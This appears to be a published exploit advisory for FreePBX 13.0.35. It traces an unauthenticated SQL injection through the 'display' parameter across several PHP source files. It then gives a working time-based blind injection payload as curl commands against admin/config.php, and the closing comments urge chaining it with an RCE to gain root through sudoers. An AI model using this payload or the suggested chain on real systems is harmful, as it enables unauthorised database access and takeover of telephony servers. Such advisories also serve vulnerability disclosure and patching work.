@@ -1,0 +1,86 @@
+Vulnerable software : Freepbx
+Tested version : 13.0.35
+vendor : freepbx.org
+Author : i-Hmx
+Email : n0p1337@gmail.com
+Home : sec4ever.com
+
+Freepbx suffer from unauthenticated sql injection flaw due to insufficient sanitization of "display" parameter
+ 
+File : admin/libraries/DB.class.php
+    public function getAll($sql,$params=array(),$fetchmode=DB_FETCHMODE_DEFAULT) {
+        //this is a sad workaround for people who couldn't follow documentation for functions
+        $fetchmode = $this->isFetchMode($params) ? $params : $fetchmode;
+        self::$error = null;
+        try {
+            $fetch = $this->correctFetchMode($fetchmode);
+            if(!empty($params) && is_array($params)) {
+                $this->res = $this->db->prepare($sql);
+    ------->>>>> $this->res->execute($params);
+                return $this->res->fetchAll($fetch);
+            }
+            $this->res = $this->db->query($sql);
+            if($this->res === false) {
+                return false;
+            }
+            return $this->res->fetchAll($fetch);
+        } catch (Exception $e) {
+            return new DB_Error($e);
+        }
+    }
+
+File : admin/libraries/modulefunctions.class.php
+Line 593
+        function getinfo($module = false, $status = false, $forceload = false) {
+
+        global $amp_conf, $db;
+        $modules = array();
+
+        if ($module) {
+            // get info on only one module
+            $xml = $this->_readxml($module);
+            if (!is_null($xml)) {
+                $modules[$module] = $xml;
+                // if status is anything else, it will be updated below when we read the db
+                $modules[$module]['status'] = MODULE_STATUS_NOTINSTALLED;
+            }
+
+            // query to get just this one
+    ---===>>>> $sql = 'SELECT * FROM modules WHERE modulename = "'.$module.'"';
+        }
+        if ($module || !$modulelist->is_loaded()) {
+    ---===>>>$results = $db->getAll($sql,DB_FETCHMODE_ASSOC);
+            if(DB::IsError($results)) {
+                die_freepbx($sql."<br>\n".$results->getMessage());
+            }
+       
+File : admin/libraries/modulefunctions.legacy.php
+Line 52
+        function module_getinfo($module = false, $status = false, $forceload = false) {
+            _module_backtrace();
+            $modulef = module_functions::create();
+        ---===>>> return $modulef->getinfo($module, $status, $forceload);
+        }
+
+File : admin/views/noaccess.php
+        <?php
+        $display = isset($_REQUEST['display'])?$_REQUEST['display']:false;
+    ---===>>> $modinfo = \module_getinfo($display);
+
+'display' parameter is being passed to sql execute() func without perior sanitization which lead to obvious sql injection flaw without any pre-needed authentication
+
+POC :
+
+Normal request
+
+[root:/fpbx]# curl -o /dev/null -s -w "Total request time : %{time_connect} + %{time_starttransfer} =  %{time_total}\n" 'http://x.x.x.x/admin/config.php?display=f4ris'
+Total request time : 0.001 + 0.309 =  0.334
+
+Sql injected
+
+[root:/fpbx]# curl -o /dev/null -s -w "Total request time : %{time_connect} + %{time_starttransfer} =  %{time_total}\n" 'http://x.x.x.x/admin/config.php?display=f4ris"XOR(if(6661=6661,sleep(0.03),0))OR"*/'
+Total request time : 0.158 + 4.391 =  4.417
+
+# Mix this with the 13.0.35 RCE one , and you are ok to get root just by echoing asterisk to the sudoers ;)
+# We're still ruling the game idiots , from Eg-R1z with dust xDD
+# ./f4ris
